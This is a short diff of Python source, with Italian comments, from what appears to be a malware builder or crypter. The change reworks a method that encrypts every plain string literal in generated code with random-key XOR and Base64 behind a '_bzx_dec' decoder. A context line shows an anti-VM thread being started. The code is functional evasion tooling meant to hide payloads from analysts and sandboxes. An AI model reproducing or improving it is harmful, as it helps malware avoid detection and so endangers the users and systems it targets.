@@ -106,27 +106,24 @@ threading.Thread(target=anti_vm_loop, daemon=True).start()
 '''
     
     def _obfuscate_strings(self, code):
-        """Offusca tutte le stringhe con XOR + Base64"""
-        import re
-        
+        """Offusca stringhe plain con XOR + Base64; ignora stringhe con prefisso f/r/b."""
+
         def encrypt_match(match):
-            s = match.group(0)
-            if len(s) <= 3:
-                return s
-            if s.startswith('"') and s.endswith('"'):
-                s = s[1:-1]
-            elif s.startswith("'") and s.endswith("'"):
-                s = s[1:-1]
-            else:
+            double = match.group(2) is not None
+            prefix = match.group(1) if double else match.group(3)
+            content = match.group(2) if double else match.group(4)
+            if prefix:
+                # f-string / raw / bytes: non offuscare (il prefisso romperebbe la chiamata)
                 return match.group(0)
-            
+            if len(content) <= 3:
+                return match.group(0)
             key = random.randint(1, 255)
-            encrypted = bytes([ord(c) ^ key for c in s])
+            encrypted = bytes([ord(c) ^ key for c in content])
             encoded = base64.b64encode(encrypted).decode()
-            return f"_bzx_dec('{encoded}', {key})"
-        
-        string_pattern = r'"([^"\\]*(\\.[^"\\]*)*)"|\'([^\'\\]*(\\.[^\'\\]*)*)\''
-        
+            return "_bzx_dec(" + repr(encoded) + ", " + str(key) + ")"
+
+        string_pattern = r'([rRfFbB]*)"([^"\\]*(?:\\.[^"\\]*)*)"|([rRfFbB]*)\'([^\'\\]*(?:\\.[^\'\\]*)*)\''
+
         decrypt_func = '''
 def _bzx_dec(s, k):
     try:
